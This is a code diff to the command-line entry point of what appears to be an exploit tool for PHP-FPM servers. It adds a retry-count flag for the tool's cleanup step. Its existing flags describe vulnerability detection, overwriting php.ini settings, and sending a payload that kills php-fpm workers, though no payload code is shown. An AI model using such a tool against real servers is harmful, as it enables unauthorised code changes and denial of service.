@@ -20,6 +20,7 @@ func main() {
 		killCount    int
 		resetSetting bool
 		resetRetries int
+		cleanRetries int
 		onlyQSL      bool
 		params       = &AttackParams{}
 		delay        time.Duration
@@ -64,6 +65,10 @@ func main() {
 				}
 				log.Printf("I did my best trying to set %#v", setting)
 				return
+			}
+
+			if cleanRetries == -1 {
+				cleanRetries = 1 << 30
 			}
 
 			if setting != "" {
@@ -113,7 +118,7 @@ func main() {
 				return
 			}
 
-			if err := Attack(requester, params); err != nil {
+			if err := Attack(requester, params, cleanRetries); err != nil {
 				log.Fatalf("Attack returned error: %v", err)
 			}
 		},
@@ -128,6 +133,7 @@ func main() {
 	cmd.Flags().BoolVar(&onlyQSL, "only-qsl", false, "stop after QSL detection, use this if you just want to check if the server is vulnerable")
 	cmd.Flags().BoolVar(&resetSetting, "reset-setting", false, "try to reset setting (requires attack params)")
 	cmd.Flags().IntVar(&resetRetries, "reset-retries", SettingEnableRetries, "how many retries to do for --reset-setting, -1 means a lot")
+	cmd.Flags().IntVar(&cleanRetries, "clean-retries", SettingEnableRetries, "how many retries to do for the cleanup command, -1 means a lot")
 	cmd.Flags().StringVar(&setting, "setting", "", "specify custom php.ini setting for --reset-setting")
 	cmd.Flags().BoolVar(&killWorkers, "kill-workers", false, "just kill php-fpm workers (requires only QSL)")
 	cmd.Flags().IntVar(&killCount, "kill-count", SettingEnableRetries, "how many times to send the worker killing payload")
